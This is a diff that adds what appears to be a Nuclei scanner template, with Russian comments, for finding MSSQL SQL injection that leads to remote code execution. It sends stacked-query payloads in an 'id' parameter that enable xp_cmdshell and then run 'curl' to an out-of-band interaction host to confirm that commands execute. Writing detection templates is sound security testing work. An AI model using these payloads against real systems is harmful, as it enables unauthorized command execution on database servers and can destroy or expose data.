@@ -1,0 +1,26 @@
+id: mssql-enable-xp-cmdshell-oob
+
+info:
+  name: MSSQL enable and test xp_cmdshell OOB
+  severity: critical
+  author: reewardius
+  tags: mssql,sqli,rce,oob
+
+http:
+  # Шаг 1: Включаем xp_cmdshell
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--"
+
+    # Нет матчеров — мы просто активируем опцию
+
+  # Шаг 2: Тестируем OOB через xp_cmdshell
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1; exec master..xp_cmdshell 'curl http://{{interactsh-url}}'--"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
